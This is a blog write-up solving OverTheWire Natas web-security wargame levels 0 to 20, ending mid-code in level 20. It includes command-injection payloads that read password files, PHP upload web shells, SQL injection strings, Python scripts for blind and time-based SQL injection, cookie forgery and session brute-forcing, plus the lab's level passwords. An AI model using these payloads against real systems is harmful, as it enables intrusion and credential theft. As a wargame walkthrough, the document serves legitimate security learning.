---
title: "Write-up for Natas Overthewire Wargame"
date: 2025-03-31
categories: [Web Security, Wargame]
tags: [Web Security]
---


> **General information:**
> Link: [https://overthewire.org/wargames/natas/](https://overthewire.org/wargames/natas/)
> Natas teaches the basics of serverside web-security.
>
> Each level consists of its own website. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.
>
> Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/

## Level 0

Typing the username and password (natas0 by default) to be redirected to the level's website.

Right-click and choose 'View page source' → receive the password for level 1.

![image](/assets/images/level-0-1.png)

The password for level 1 is **0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq**

## Level 1

Logging in with the password found in the previous level.

Visiting the website, I have received an message that the right-click function is disabled.

![image](/assets/images/level-1-1.png)

Searching for the shortcut to view page source.

Pressing Ctrl + U, I see that the password is hidden in a comment.

![image](/assets/images/level-1-2.png)

The password for level 2: **TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI**

## Level 2

Logging in with the password found in the previous level.

Visiting the website, I have received a message:

![image](/assets/images/level-2-1.png)

There's nothing in the page. So I try inspecting the website to find some hints.

![image](/assets/images/level-2-2.png)

I have found a suspicious image tag, the image is only in 1x1 pixel and even not appear in the website. The image is contained in a folder called **files**.

Go to the source of the image by extending the link of the website.

![image](/assets/images/level-2-3.png)

There's another .txt file. Clicking to view the content of the file, I have received the password for level 3.

![image](/assets/images/level-2-4.png)

The password for level 3 is **3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH**

## Level 3

Logging in with the password found in the previous level.

As the level 2, there's nothing in the page. So I try inspecting the website to find more hints.

![image](/assets/images/level-3-1.png)

I have found a strange comment: 'No more information leak, not even Google will find it this time'.

After a short research, I have known that there's a file called **robots.txt**, which used to manage what information of a website that can be searched and accessed through the Internet.

Try going to the **robots.txt** file on this website by extend the link with **/robots.txt**.

![image](/assets/images/level-3-2.png)

I have received another path called **/s3cr3t/** (maybe it means **secret**) to 'disallow' files or folders. Then I follow that path.

![image](/assets/images/level-3-3.png)

I found another .txt file. Try opening it, then I have received the password for level 4.

![image](/assets/images/level-3-4.png)

The password for level 4 is **QryZXc2e0zahULdHrtHxzyYkj59kUxLQ**

## Level 4

Logging in with the password found in the previous level.

![image](/assets/images/level-4-1.png)

I have received a message: 'Access disallowed' and the reason refer to the 'source' of my request (it must be natas5 instead of natas4).

I guess that this level asks me to change my 'source' to 'natas5'.

Try refreshing website a few times.

![image](/assets/images/level-4-2.png)
![image](/assets/images/level-4-3.png)

The URL was appeared and changed, but it still from natas4.

Let's make a little bit research to know how to change 'where I am from'.

![image](/assets/images/level-4-4.png)

This problem refers to a content named **Referer** in the HTML GET request.

I think I can catch the request and change the **Referer** content in the request.

![image](/assets/images/level-4-5.png)

In the GET request, it really contains my **Referer** → use BurpSuite to catch this GET request and change the **Referer**.

![image](/assets/images/level-4-6.png)

Adding this request to Repeater, then change the **Referer** and resend the request.

![image](/assets/images/level-4-7.png)

The password for level 5 is **0n35PkggAPm2zbEpOU802c0x0Msn1ToK**

## Level 5

![image](/assets/images/level-5-1.png)

Going to the level's website, I have received a message 'You are not logged in'.

I have no hints about the login function on this website. Let's inspect the website to find more hints.

![image](/assets/images/level-5-2.png)

In the Cookies tab of this website, I found a cookies called 'loggedin' and it's current value is 0 (maybe it indicates that I haven't logged in).

Try changing the cookies' value to 1 (or any number that's not equal to 0, I think) and reload the website.

![image](/assets/images/level-5-3.png)

The password for level 6: **0RoJwHdSKWFTYR5WuiAewauSuNaBXned**

## Level 6

![image](/assets/images/level-6-1.png)

Going to the level's website, I have received a form, it requires 'secret' (maybe something like a password). Currently, I don't have any hint about the 'secret', I have tried typing some random 'secret', but all of them are wrong.

There's also a 'View sourcecode' button, try clicking on it, then I can view the source code of the website.

![image](/assets/images/level-6-2.png)

There's maybe a PHP code contained in the source.

It includes a file in the path: **includes/secret.inc**. The function of this code is to check if the 'secret' that user types is correct. The 'secret' is contained in the file **secret.inc**.

Following that path by extending the link of the website:

![image](/assets/images/level-6-3.png)

An empty website, try inspecting it.

![image](/assets/images/level-6-4.png)

I can see the 'secret' immediately in the HTML: **FOEIUWGHFEEUHOFUOIU**

Back to the home page, submit and receive the password for level 7: **bmg8SvU1LizuWjx3y7xkNERkHxGre0GS**

## Level 7

![image](/assets/images/level-7-1.png)

This is the main page of the website. There's 2 tabs: Home and About.

Look at the URL, there's a parameter on it: **page**. Change between Home and About, the value pass to this parameter changes as same as the tabs.

Try inspecting the website:

![image](/assets/images/level-7-2.png)

There's a hint about the path where the password for level 8 is contained.

Try changing the value of the parameter **page** to the path above, then I have successfully received the password for level 8: **xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q**

![image](/assets/images/level-7-3.png)

## Level 8

![image](/assets/images/level-8-1.png)

The home page of this level is the same as level 6.

There's no hint about the secret. Let's go to the source code.

![image](/assets/images/level-8-2.png)

There's a short PHP code about encoding and decoding.

To get the secret, I have to submit a string as a parameter of the function `encodeSecret`. If this function returns a string which is similar to `$encodeSecret`, the 'secret' will be revealed.

To solve this, we try to decode `$encodeSecret`: **hex2bin → strrev → base64_decode**.

This is a script written in Python to solve this problem:

```python
import base64
import binascii

# Encoded secret from PHP code
encoded_secret = "3d3d516343746d4d6d6c315669563362"

# Reverse the encoding steps
# 1. Convert from hex to bytes
decoded_hex = binascii.unhexlify(encoded_secret)

# 2. Reverse the string
reversed_string = decoded_hex[::-1]

# 3. Decode from Base64
original_secret = base64.b64decode(reversed_string).decode()

print(original_secret) 
```

![image](/assets/images/level-8-3.png)

The string after decoding: **oubWYf2kBq**. This is also the 'secret'.

![image](/assets/images/level-8-4.png)

Submitting it and receive the password for level 9: **ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t**

## Level 9

![image](/assets/images/level-9-1.png)

The home page is the same as level 8. There's no hint about the function 'Find words containing'. Let's try exploiting the source code.

![image](/assets/images/level-9-2.png)

There's a function to check if the input is contained in the file `dictionary.txt`.

This function use `passthru`, which is able for me to exploit. Let's make a short research about `passthru`.

![image](/assets/images/level-9-3.png)

It seems that this function take a command as an input, execute it and print directly to the browser without any checking.
In the PHP code given, the command is `grep -i $key dictionary.txt`, which means it returns the result of finding the word `key` in the file `dictionary.txt`.

There're some ways to run multiple commands in 1 line. Let's make a short research.

![image](/assets/images/level-9-4.png)

It seems that I can use `&&` or `;` to seperate 2 commands. The difference is if I use `&&`, all commands must be successfully executed. So I will use `;`, which is safer.

![image](/assets/images/level-9-5.png)

In the introduction of this wargame, there's a hint that all passwords are stored in `/etc/natas_webpass/natasX (X is the level)`.

→ I will run these 2 commands in 1 line: `hello ; cat /etc/natas_webpass/natas10`

![image](/assets/images/level-9-6.png)

The password for level 10 is **t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu**

## Level 10

![image](/assets/images/level-10-1.png)

This level is similar to the previous level, but it seems that the website has added some filters for certain characters (like `;` that I used in the previous level).

Let's go to the source code and explore how to bypass the filters.

![image](/assets/images/level-10-2.png)

This website now using `preg_match` to find if my input contains special characters: `/`, `[`, `;`, `&`, ... → this filter prevents me from using `;` or `&` like in the previous level.

But if my input do not contains special characters above, I can still run commands by `passthru` → I must find a way to run commands without using special characters `;` or `&`.

There's only a way left: grep command. Let's make a short research about this command.

![image](/assets/images/level-10-3.png)

The `grep` command allows us to give multiple files for searching. So I can add the file containing the password: `/etc/natas_webpass/natas11`.

But there's a problem: I don't know which string or character is contained in the password, so I try searching a letter only, if it's match, the password will be revealed.

→ Using this input: `a /etc/natas_webpass/natas11` (Only search for letter `a`, if it's not match, try another letter).

![image](/assets/images/level-10-4.png)

The password of the level 11 is: **UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk**

## Level 11

![image](/assets/images/level-11-1.png)

There's a form, which allows me to set the background color by hexadecimal color.

There's an message: 'Cookies are protected with XOR encryption'.

Let's go to the source code to find some hints.

![image](/assets/images/level-11-2.png)

```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>
```

I have inspected the website and take the cookie `data` from storage: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`

The `defaultdata` has 2 fields: `array( "showpassword"=>"no", "bgcolor"=>"#ffffff")`;

I have to change the value of the field `showpassword` to `yes` → the password will be revealed.

But the problem is I don't have the key in `xor_encryption`. But I can find the ciphertext and the plaintext, then follow the formular: `ciphertext ^ plaintext = key` → get the `key`.

Paying attention on this command:
`$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);`

Before being parameter on `xor_encrypt`, the cookie is base64 decoded.

→ I have to decode the cookie that I got from the website, this is the first paramter of `xor_encrypt`.

Moreover, I have to `json_encode` the `defaultdata` → the ciphertext and plaintext have the same type of value → able to find the key.

Ciphertext is the value I got from the cookie `data` on the website, Plaintext is the value of `defaultdata`:

- Ciphertext (after `base64 decode`): `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=`
- Plaintext (after `json_encode`): `{"showpassword":"no", "bgcolor":"#ffffff"}`

Write a Python script to find out the key:

```python
import base64
import json

ciphertext = b'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg='
ciphertext = base64.decodebytes(ciphertext)

plaintext = {"showpassword":"no", "bgcolor":"#ffffff"}
plaintext = json.dumps(plaintext).encode('utf-8').replace(b" ", b"")

def xor_encrypt(plaintext, ciphertext):
    key = ""
    
    for i in range(len(plaintext)):
        key += str(chr(ciphertext[i]^ plaintext[i % len(plaintext)]))
        
    return key

key = xor_encrypt(plaintext, ciphertext)

print(key)
```

![image](/assets/images/level-11-3.png)

→ key: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`

Then, I change the value of the field `showpassword` to `yes` → find the data → change the value of the cookie on the website.

Now I have plaintext (`defaultdata` with the value of the `showpassword` is `yes`) and key → find `ciphertext`.

I have this command in `loadData` function:
`$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);`

This command convert cookie data to JSON data used to load background color (`defaultdata`).

Now I have JSON data, I will process oppositely to the processing above:
`json_encode` → `xor_encrypt` → `base64_encode`.

Write a Python script to solve this problem:

```python
import base64
import json

plaintext = {"showpassword":"yes", "bgcolor":"#ffffff"}
plaintext = json.dumps(plaintext).encode('utf-8').replace(b" ", b"")

key = b'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeD'

def xor_encrypt (key, plaintext):
    ciphertext = ''
    for i in range (len(key)):
        ciphertext += str(chr(plaintext[i] ^ key[i % len(key)]))
        
    return ciphertext

data = xor_encrypt(key, plaintext)

data = base64.encodebytes(data.encode('utf-8'))

print(data)
```

Add a letter `D` after the key because I have changed the value from `no` to `yes` → the new value have 1 letter more than the old one.

![image](/assets/images/level-11-4.png)

The cookie data: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`

Now change the value of the cookie `data` and receive the password for level 12.

Password: **yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB**

## Level 12

![image](/assets/images/level-12-1.png)

This level's website allows me to upload an image (max: 1kB).

![image](/assets/images/level-12-2.png)

After upload, there's only a message containing the path to this image. Let's go to exploit the source code.

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

Let's make a short analysis on this php script:

- The function `genRandomString` generates a 10-character string using `mt_rand` function (maybe `mt-19937`).

- The function `makeRandomPath` generates a random path with 2 parameters: `dir` (direction) and `ext` (extension) → `dir/{genRandomString}.ext`.

- The function `makeRandomPathFromFilename` get the uploaded file's extension and returns a random path using the function `makeRandomPath`.

- The next script receives the uploaded file and creates path, then stores it on `target_path`, checks the file's size and stores it.

In the PHP script, I do not see any command to check the extension of the file, but in HTML, the extension is `jpg`, website also asks to upload .jpg file.

![image](/assets/images/level-12-3.png)

→ Maybe I can upload a PHP script to print out the content (password) of the file: `/etc/natas_webpass/natas13`. But at first, the file's extension must be kept as `.php`.

Let's make a short research to know how to keep the file's extension.

![image](/assets/images/level-12-4.png)

![image](/assets/images/level-12-5.png)

It is able to write a PHP script to print out the password and use Burp to keep the file's extension as `.php`.

```php
<?php
echo system ("cat /etc/natas_webpass/natas13");
?>
```

![image](/assets/images/level-12-6.png)

The file's extension is automatically set to `.jpg`, let's change it to `.php`.

![image](/assets/images/level-12-7.png)

The file hass been successfully uploaded as `.php`.

Let's click on the path to view

![image](/assets/images/level-12-8.png)

The password of level 13 is **trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**

## Level 13

The same as level 12, but now the website has been added a filter to the extension of the file.

![image](/assets/images/level-13-1.png)

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

This website uses `exif_imagetype` to check the if the file is an image or not. Let's make a short research about this function.

![image](/assets/images/level-13-2.png)

This function reads the first bytes of an image. Let's research more to know about **the first bytes** of a image.

![image](/assets/images/level-13-3.png)

I have explored that `.jpg` files contain these bytes in the head of the file: `FF D8 FF E0`.

→ I only need to 'fake' these bytes in the first of the `.jpg` file, then insert PHP script to print out the password.

```shell=
echo -ne "\xFF\xD8\xFF\xE0" > shell.jpg
echo "<?php system('cat /etc/natas_webpass/natas14'); ?>" >> shell.jpg
```

Running these script in terminal to make the image file.

Using the same skill used in the previous level to get the password.

![image](/assets/images/level-13-4.png)

The password for level 14 is **z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ**

## Level 14

![image](/assets/images/level-14-1.png)

This is a login form. But I don't have any hint about the username and password. Let's try submitting some random usernames and passwords.

![image](/assets/images/level-14-2.png)

Of course, I can't login. Let's view source code.

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

This is a basic SQL injection.

The query: `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";`

Type in the `Username`: `" OR 1=1#` → make the password checking become a comment and make a bitwise operation OR between the username checking query and `1=1` (which is always return `true`) → login successfully.

![image](/assets/images/level-14-3.png)

![image](/assets/images/level-14-4.png)

Password for level 15: **SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**

## Level 15

![image](/assets/images/level-15-1.png)

The website allows me to check if a username is already existed.

The sourcecode:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

This level looks tricky, it only gives us "This user exists" or "This user doesn't exist". Let's try searching `natas16`.

![image](/assets/images/level-15-2.png)

It seems that the password of this user is also the password of level 16. Look at the query:
`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`

I think I can add another statement to check the password by bruteforcing each character. For example, let's check if the password contains letter `a` (then `b`, `c`, ...) → if the website returns `This user exists`, this means the password contains the letter above.

Write a Python script to solve this task:

```python
import requests
import string

# Target information
url = "http://natas15.natas.labs.overthewire.org/index.php"
auth_username = "natas15"
auth_password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
target_username = "natas16"

# Characters to try for the password
chars = string.ascii_letters + string.digits

# Function to check if a SQL condition is true
def check_condition(condition):
    # Create a payload that uses SQL injection to check our condition
    payload = {"username": f'natas16" AND {condition} #'}
    
    # Send the request with authentication
    response = requests.post(
        url,
        auth=(auth_username, auth_password),
        data=payload
    )
    
    # Check if the response contains "This user exists"
    return "This user exists" in response.text

# Extract the password
password = ""
password_length = 32  # We'll assume the password is 32 characters long

print("Starting password extraction...")

# Extract each character of the password
for position in range(1, password_length + 1):
    for char in chars:
        # Create a SQL condition that checks if the character at this position equals our guess
        condition = f"BINARY SUBSTRING((SELECT password FROM users WHERE username='{target_username}'), {position}, 1) = '{char}'"
        
        if check_condition(condition):
            password += char
            print(f"Found character at position {position}: {char}")
            print(f"Current password: {password}")
            break

print("\nExtraction complete!")
print(f"Password for {target_username}: {password}")
```

![image](/assets/images/level-15-3.png)

The password for level 16: **hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**

## Level 16

![image](/assets/images/level-16-1.png)

Find words containing again!

The sourcecode:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Try submitting `<letter> /etc/natas_webpass/natas16` like the trick used in level 10, but it returns nothing. Maybe it doesn't work in this level.

There's an obvious missing by the filter: `$()`.

![image](/assets/images/level-16-2.png)

`$()` contains a command, this command is executed in a subshell. If it returns a value or something like that, the output is placed in the original command.

→ I can do something like:
`$(<command>)word` → if the command returns an output, it is attached with the word → this "new word" will not match with any word in the dictionary → returns nothing.

On the other hand, if the command does not return an output, the word is still the word, after searching, some words have appeared.

→ I can brute-force each letter of the password, the value returned is 'true' or 'false'.

If this value is true, it will change the word → there's nothing after searching. If it is false, there're results after searching.

Let's write a short Python script to do this task.

```python
import requests
import string

username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

url = f"http://{username}.natas.labs.overthewire.org"

CHARSET = string.ascii_letters + string.digits
PASSWORD_LENGTH = 32

found_password = ""

for i in range(PASSWORD_LENGTH):
    for char in CHARSET:
        payload = f'$(grep ^{found_password}{char} /etc/natas_webpass/natas17)penetration'
        
        response = requests.get(url, auth=(username, password), params={"needle": payload})
        
        if ('penetration' not in response.text):
            found_password += char
            print(f"[+] Found character {i+1}: {char} → {found_password}")
            break
        
print(found_password)
```

Password for level 17: **EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC**

## Level 17

![image](/assets/images/level-17-1.png)

There's a form to check the existence of a username.

Source code:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Another SQL injection challenge.

This level is different from level 15, as the website does not return anything to the screen because the `echo` commands is in comments.

I have to find other ways to know whether a username is existing.

I can try applying 'Time-based blind SQL injection', it means adding a sleep() when the return value is true, to distinguish it from the false one.

Write a short Python script like the previous level:

```python
import requests
import string
import sys

url = 'http://natas17.natas.labs.overthewire.org/'
username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

characters = string.ascii_letters + string.digits

passwordFound = ''

sql1 = 'natas18" AND password LIKE BINARY "'
sql2 = '"AND SLEEP(5)-- ' 

s = requests.Session()
s.auth = (username, password)

while len(passwordFound) < 32:
    for char in characters:
        payload = sql1 + passwordFound + char + '%' + sql2
        data = {'username': payload}
        response = s.post(url, data=data)
        if response.elapsed.total_seconds() >= 5:
            passwordFound += char
            print(passwordFound)
            break
```

![image](/assets/images/level-17-2.png)

The password of level 18 is **6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ**

## Level 18

![image](/assets/images/level-18-1.png)

There isn't any hint about the `admin account`.

Source code:

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { 
    return 0;
}

function isValidID($id) { 
    return is_numeric($id);
}

function createID($user) { 
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) { 
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() { 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

Starting analyze some functions:

```php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

This function is used to print password if `_SESSION` is not empty, consists (key, value) = (admin, 1).

`$_SESSION["admin"] = isValidAdminLogin();` This command in the main function always set `$_SESSION["admin"] = 0.` → There's no way that a new user typing username and password, then become admin.

→ `my_session_start()` must return true.

But this function returns true when the `PHPSESSID` is contained in cookie that sent to server through requests. `PHPSESSID` is maybe admin's `session_id`. If we have this ID, we can 'borrow' admin privilege.

A user's `session_id` is random from 1 to 640 → I can brute-force this number easily.

This is a short Python script to solve this task:

```python
import requests

url = 'http://natas18.natas.labs.overthewire.org/'
username = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

auth = requests.auth.HTTPBasicAuth(username, password)

for i in range(1, 641):
    cookies = {'PHPSESSID': str(i)}
    response = requests.get(url, auth=auth, cookies=cookies)
    if 'You are an admin' in response.text:
        print(i)
        break
```

![image](/assets/images/level-18-2.png)

I have found the `PHPSESSID` (session_id of an admin). Access to the website, change the value of the session cookie to 119, then refresh and retrieve the password.

![image](/assets/images/level-18-3.png)

The password of level 19 is **tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr**

## Level 19

![image](/assets/images/level-19-1.png)

Mostly the same as level 18, but now the session_id is no longer sequential (not a random number between 1 and 640).

Let's try logging in with some different random accounts to find out the formular of the session_id.

![image](/assets/images/level-19-2.png)

This is a hex value: `3432322d6e6861746e616d`.
Converting to ascii: `422-nhatnam` (I have logged in with the username `nhatnam`).

→ The formular of the session_id is `X-username` with `X` is a random number (maybe) between 1 and 640.

Same approach like the previous level: brute-force the `X` number.

```python
import requests
import binascii

url = 'http://natas19.natas.labs.overthewire.org/'
username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'

auth = requests.auth.HTTPBasicAuth(username, password)

for i in range(100, 1000):
    cookies_hex = binascii.hexlify((str(i) + '-admin').encode()).decode()
    cookies = {'PHPSESSID': cookies_hex}
    response = requests.get(url, auth=auth, cookies=cookies)
    if 'You are an admin' in response.text:
        print(cookies_hex)
        break
```

![image](/assets/images/level-19-3.png)

Cookie value: `3238312d61646d696e`

![image](/assets/images/level-19-4.png)

The password of level 20 is **p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw**

## Level 20

![image](/assets/images/lv20-1.png)

Source code:

```php
<?php

function debug($msg) {
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

